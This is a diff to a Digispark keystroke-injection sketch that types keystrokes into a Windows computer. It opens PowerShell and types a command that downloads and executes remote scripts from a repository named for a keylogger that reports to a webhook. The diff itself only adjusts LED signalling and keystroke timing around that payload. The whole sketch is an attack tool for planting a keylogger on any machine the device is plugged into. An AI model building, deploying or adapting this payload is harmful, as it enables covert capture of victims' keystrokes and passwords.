@@ -3,10 +3,15 @@
 
 #include "DigiKeyboard.h"
 void setup() {
+  //turn LED off while code is running, this means the device is safe to unplug as soon as the LED turns back on
+  
+  pinMode(1, OUTPUT); //LED on Model A
+  digitalWrite(1, HIGH);
+  DigiKeyboard.delay(100);
+  digitalWrite(1, LOW);
   DigiKeyboard.sendKeyStroke(0);
- DigiKeyboard.delay(1000);
-DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT, KEY_R);
-DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(1000);
 DigiKeyboard.print("powershell");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(300);
@@ -14,8 +19,7 @@ DigiKeyboard.print("cd $env:temp");
 DigiKeyboard.delay(300);
 DigiKeyboard.print("IEX(IWR https://raw.githubusercontent.com/ISykeI/Digispark_Keylogger_Webhook/main/keylog.ps1 -UseBasicParsing); Invoke-keylog.ps1;IEX(IWR https://raw.githubusercontent.com/ISykeI/Digispark_Keylogger_Webhook/main/time.ps1 -UseBasicParsing); Invoke-time.ps1;");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
-
-for(;;){ /*empty*/ };
+digitalWrite(1, HIGH);
 }
 
 void loop() {
